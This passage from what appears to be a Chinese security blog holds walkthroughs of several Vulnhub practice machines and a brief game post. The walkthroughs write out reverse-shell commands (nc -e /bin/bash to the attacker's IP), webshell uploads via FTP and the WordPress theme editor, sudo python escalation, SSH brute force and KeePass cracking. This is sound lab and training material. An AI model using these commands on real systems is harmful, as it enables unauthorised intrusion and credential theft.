-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.101，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/5.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-2/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="登录ftp上传webshell">登录Ftp，上传webshell</span></h3><blockquote>
-<p>1.使用anonymous直接登录ftp，发现当前目录可写：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp open 192.168.56.101</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/7.png" alt="image-"></p>
-<p>2.则可上传webshell，这里利用kali自带的webshell简单修改后上传：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php，修改ip为kali的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/8.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put php-reverse-shell.php，ftp上传webshell，要在/usr/share/webshells/php/目录下</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/9.png" alt="image-"></p>
-<p>3.kali开启监听，从靶机&#x2F;files目录下访问webshell，得到shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001，利用刚才设定的端口</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/10.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-2/11.png" alt="image-"></p>
-</blockquote>
-<h3><span id="目录搜索进行提权">目录搜索，进行提权</span></h3><blockquote>
-<p>1.可以对&#x2F;home目录进行一下搜寻，发现important.txt的文件，提示我们去运行.runme.sh，并得到用户名和md5后的密码：</p>
-<p><img src="/2022/06/13/Hackable-2/12.png" alt="image-"></p>
-<p>2.通过对密码的md5破解，其实就可以登录shrek，ssh登录后，可以查看shrek &#x2F;home目录下的文件user.txt：</p>
-<p><img src="/2022/06/13/Hackable-2/13.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-2/14.png" alt="image-"></p>
-<p>3.再来看看能从什么地方进行提权，发现可以直接使用python：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/15.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/python3.5 -c &#x27;import os;os.system(&quot;/bin/sh&quot;)&#x27;，直接提权</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/16.png" alt="image-"></p>
-<p>4.最后在&#x2F;root目录下，发现root.txt，即flag：<br><img src="/2022/06/13/Hackable-2/17.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hackable/" rel="tag">Hackable</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/Grotesque-2/">
-                Grotesque 2
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="grotesque2">Grotesque:2</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称grotesque2">名称：Grotesque:2</span></h4><h4><span id="发布日期2021330">发布日期：2021.3.30</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列grotesque">系列：Grotesque</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>angel:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名grotesque2_vhova">文件名：grotesque2_vh.ova</span></h4><h4><span id="文件大小824mb">文件大小：824MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagegrotesquegrotesque2_vhova">下载地址：</span></h4><h4><span id="md5-57a2630c846d285b1390789d2d5b1c3d">MD5: 57A2630C846D285B1390789D2D5B1C3D</span></h4><h4><span id="sha1-b6fa719aca753e479dc5d3425b0c7a4435019c59">SHA1: B6FA719ACA753E479DC5D3425B0C7A4435019C59</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机grotesque2和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Grotesque-2/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现开放了很多端口，看来是做迷惑，访问主页，源码只有js内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.109 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/4.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现也是很多目录且无法对应端口，没办法，把全部的index页获取下来，按大小排序，找寻线索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.109/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt –wildcard switch，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/6.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;23..600&#125;; do wget 192.168.56.109:$i -O index$i; done，获取各端口index</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/7.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la | sort，排序文件，最大是index258</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/8.png" alt="image-"></p>
-</blockquote>
-<h3><span id="发现目标页">发现目标页</span></h3><blockquote>
-<p>1.访问一下大小最大的页面192.168.56.108:258，页面提示我们ssh用户名，我们查看页面源码，发现ok的emoji其实是一张图片：</p>
-<p><img src="/2022/06/13/Grotesque-2/9.png" alt="image-"></p>
-<p>2.将emoji的图片下载，放大后得到一串类似md5的字串，直接md5无法解出，但是页面有提示我们-100，得到ssh密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.109:258/emoji/hand.png</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/10.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/11.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/12.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh登录">SSH登录</span></h3><blockquote>
-<p>1.通过刚才的ssh用户名提示，我们可以试出是用户angel的密码，也可以使用hydra进行爆破，将ssh用户统一写入use.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L use.txt -p solomon1 ssh://192.168.56.109</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/13.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/14.png" alt="image-"></p>
-<p>2.登录后在目录下发现第一个flag，user.txt：</p>
-<p><img src="/2022/06/13/Grotesque-2/15.png" alt="image-"></p>
-</blockquote>
-<h3><span id="pspy64s-监控进程获取flag">pspy64s 监控进程，获取flag</span></h3><blockquote>
-<p>1.进入quiet文件夹，发现大量数字命名文件，用pspy64s进行进程监控，发现有定时任务的读写检查：</p>
-<p><img src="/2022/06/13/Grotesque-2/16.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br><span class="line">wget http://192.168.56.102:8001/pspy64s，angel获取pspy64s工具</span><br><span class="line">chmod +x pspy64s，给予执行权力</span><br><span class="line">./pspy64s，开启进程监听</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/17.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/18.png" alt="image-"></p>
-<p>2.删去quiet目录下所有文件，让定时任务执行后，进一步查看，发现rootcreds.txt，可以获得root的密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf *，删除后根据进程定时大概要等待一段时间再查看</span><br><span class="line">ls -la /</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/19.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/20.png" alt="image-"></p>
-<p>3.登录root用户，在&#x2F;root目录下发现第二个flag，root.txt：</p>
-<p><img src="/2022/06/13/Grotesque-2/21.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Grotesque/" rel="tag">Grotesque</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/Grotesque-1/">
-                Grotesque 1
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="grotesque101">Grotesque:1.0.1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称grotesque101">名称：Grotesque:1.0.1</span></h4><h4><span id="发布日期2021310">发布日期：2021.3.10</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列grotesque">系列：Grotesque</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>raphael:&#x2F;<del>&#x2F;user.txt<br>root:&#x2F;</del>&#x2F;root.txt</p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名grotesque_vh-101ova">文件名：grotesque_vh-1.0.1.ova</span></h4><h4><span id="文件大小672mb">文件大小：672MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagegrotesquegrotesque_vh-101ova">下载地址：</span></h4><h4><span id="md5-7e73878bdb1251d1dadc4cc49f5bad68">MD5: 7E73878BDB1251D1DADC4CC49F5BAD68</span></h4><h4><span id="sha1-778cf0a9721e530587c78dd198039297c7bb16ab">SHA1: 778CF0A9721E530587C78DD198039297C7BB16AB</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机grotesque和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Grotesque-1/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了66和80端口，而主页并没有东西：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.108 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/4.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现只有&#x2F;javascript，也无法直接查看：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.108/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="端口指向发现">端口指向发现</span></h3><blockquote>
-<p>1.访问一下192.168.56.108:66页面，vvmlist.github.io，页面提示我们去下载这个项目，而在源码我们发现了一组很像brainfuck编码的注释：</p>
-<p><img src="/2022/06/13/Grotesque-1/7.png" alt="image-"></p>
-<p>2.brainfuck解码出来指向&#x2F;sshpasswd.png，同时我们下载下vvmlist这个项目，解压后很快就能发现这张图片：</p>
-<p><img src="/2022/06/13/Grotesque-1/8.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/9.png" alt="image-"></p>
-<p>3.利用多种工具分析sshpasswd.png没有分析出来，但靶机也没有开放22端口无法ssh登录，所以转向查看vvmlist中的其他文件，按照操作时间，我们可以发现80端口真正的指向，而且很可能是使用wordpress搭建的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat _vvmlist/* | sort | uniq</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/10.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/11.png" alt="image-"></p>
-</blockquote>
-<h3><span id="wordpress后台登录">Wordpress后台登录</span></h3><blockquote>
-<p>1.访问192.168.56.108&#x2F;lyricsblog，查看源码，我们会发现一张图片地址，查看图片，没有太多线索：</p>
-<p><img src="/2022/06/13/Grotesque-1/12.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/13.png" alt="image-"></p>
-<p>2.前面提到了这个页面是wordpress搭建的，我们使用wpscan扫描一下，也没有太多发现：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://grotesqueip/lyricsblog -e ap,cb,dbe,u1-999 --plugins-detection aggressive --plugins-version-detection aggressive</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/14.png" alt="image-"></p>
-<p>3.说句实话，思路到这里就断掉了，后来通过维基，发现&#x2F;lyricsblog页都是歌曲的歌词，然后yesman.png又提示他喜欢听hakan-tasiyan-doktor，我们尝试把这首歌的歌词全部获取下来md5然后大写一下，发现就是可以登录wordpress后台的密码，用户名是erdalkomurcu，页面有显示：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim doctor-lyrics.txt，写入歌词</span><br><span class="line">md5sum doctor-lyrics.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/15.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/16.png" alt="image-"></p>
-<p>4.访问192.168.56.108&#x2F;lyricsblog&#x2F;wp-admin，提示密码要大写，我们登录看看：</p>
-<p><img src="/2022/06/13/Grotesque-1/17.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/18.png" alt="image-"></p>
-</blockquote>
-<h3><span id="wordpress后台写入webshell准备提权">Wordpress后台写入webshell，准备提权</span></h3><blockquote>
-<p>1.在wordpress后台Appearance页Theme Editor，在404.php（my favorite）内粘贴kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php，并在kali开启对应端口监听，通过访问<br><a target="_blank" rel="noopener" href="http://192.168.56.108/lyricsblog/index.php/author/erdalkomurcu/1%E8%A7%A6%E5%8F%91webshell%EF%BC%9A">http://192.168.56.108/lyricsblog/index.php/author/erdalkomurcu/1触发webshell：</a></p>
-<p><img src="/2022/06/13/Grotesque-1/19.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/20.png" alt="image-"></p>
-<p>2.通过查看&#x2F;var&#x2F;www&#x2F;html&#x2F;lyricsblog&#x2F;wp-config.php，能够得到raphael用户及密码，登录一下试试：</p>
-<p><img src="/2022/06/13/Grotesque-1/21.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/22.png" alt="image-"></p>
-<p>3.用python建立一个交互式shell，可以发现user.txt是一串类似md5值，但是解不出来；在发现有一个.kdbx文件，应该是root的密钥库文件，获取到kali：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/23.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/24.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/25.png" alt="image-"></p>
-<p>4.对.chadroot.kdbx使用keepass2john进行解密，这里要用到rockyou.txt，下载地址为<a target="_blank" rel="noopener" href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt%EF%BC%9A">https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt：</a></p>
-<p><img src="/2022/06/13/Grotesque-1/26.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/27.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.获取到密码，利用app.keeweb.info，上传chadroot.kdbx，可以获得root密码:</p>
-<p><img src="/2022/06/13/Grotesque-1/28.png" alt="image-"></p>
-<p>2.在&#x2F;root页下获得flag，即root.txt:</p>
-<p><img src="/2022/06/13/Grotesque-1/29.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Grotesque/" rel="tag">Grotesque</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/06/Bagpipe-Module/">
-                关于泰拉大陆第一拖拉机骑手再被加强那些事
-            </a>
-        </h2>
-    
-    <time>
-        Jun 6, 2022
-    </time>
-    <section class="content">
-        <h1><span id="关于泰拉大陆第一拖拉机骑手再被加强那些事">关于泰拉大陆第一拖拉机骑手再被加强那些事</span></h1><p><img src="/2022/06/06/Bagpipe-Module/1.png" alt="image"></p>
-<p>“风笛已经是版本T0打野了，还要加强，还加强两波，策划玩不玩游戏啊！明日方舟设计师，你看看她！”	——刚走出MSI氛围的呱呱如是说到</p>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Arknights/" rel="tag">Arknights</a><a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/06/Driftingblues-9/">
-                Driftingblues 9
-            </a>
-        </h2>
-    
-    <time>
-        Jun 6, 2022
-    </time>
-    <section class="content">
-        <h1><span id="driftingblues9">Driftingblues:9</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称driftingblues9final">名称：DriftingBlues:9(final)</span></h4><h4><span id="发布日期202159">发布日期：2021.5.9</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列driftingblues">系列：DriftingBlues</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt </p>
-<h4><span id="难度困难">难度：困难</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名driftingblues9ova">文件名：driftingblues9.ova</span></h4><h4><span id="文件大小738mb">文件大小：738MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagedriftingbluesdriftingblues9ova">下载地址：</span></h4><h4><span id="md5-db7d1b48224f802666b07693acd7cdb4">MD5: DB7D1B48224F802666B07693ACD7CDB4</span></h4><h4><span id="sha1-cd8c690150b48ac4ab9e6a3d56a4f12f110c78c1">SHA1: CD8C690150B48AC4AB9E6A3D56A4F12F110C78C1</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机driftingblues9和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/06/Driftingblues-9/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现开放了80和111端口，访问主页查看源码，发现是一个ApPHP页面：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.120 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/4.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-9/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现好些目录，但也没有进一步有价值的信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.120 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="apphp漏洞利用">ApPHP漏洞利用</span></h3><blockquote>
-<p>1.在主页面能够发现一个admin登录页面：</p>
-<p><img src="/2022/06/06/Driftingblues-9/7.png" alt="image-"></p>
-<p>2.因为源码提示了我们ApPHP的相关信息，我们可以去Exploit-db(<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33070)%E6%9F%A5%E6%89%BE%E5%88%B0%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A">https://www.exploit-db.com/exploits/33070)查找到相关漏洞利用：</a></p>
-<p><img src="/2022/06/06/Driftingblues-9/8.png" alt="image-"></p>
-<p>3.执行相关python程序，我们可以获得较基础的权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 33070.py http://192.168.56.120</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/9.png" alt="image-"></p>
-</blockquote>
-<h3><span id="初步提权">初步提权</span></h3><blockquote>
-<p>1.利用得到的用户我们可以查看&#x2F;var&#x2F;www&#x2F;include&#x2F;base.inc.php文件下，有clapton用户及其密码，其实上面程序已经爆出来了：</p>
-<p><img src="/2022/06/06/Driftingblues-9/10.png" alt="image-"></p>
-<p>2.此时我们要先想办法建立交互式shell，先在kali开启端口监听，再利用靶机端返回shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444，kali开启端口监听</span><br><span class="line">which nc，靶机返回shell</span><br><span class="line">nc 192.168.56.102 4444 -e /bin/bash</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;，kali再使用python建立交互式shell</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/11.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-9/12.png" alt="image-"></p>
-<p>3.现在我们可以先确认clapton用户的存在，再进行登录了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd，确认存在clapton</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/13.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-9/14.png" alt="image-"></p>
-</blockquote>
-<h3><span id="缓冲区溢出利用">缓冲区溢出利用</span></h3><blockquote>
-<p>1.在clapton用户目录下，我们能发现第一个flag，user.txt，而另一个note.txt文件查看后是关于缓冲区溢出的提示：</p>
-<p><img src="/2022/06/06/Driftingblues-9/15.png" alt="image-"></p>
-<p>2.除了两个txt文本文件以外，还有一个input文件，这个文件用file命令查看后，明显是要对这个文件进行缓冲区溢出提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file input</span><br></pre></td></tr></table></figure>
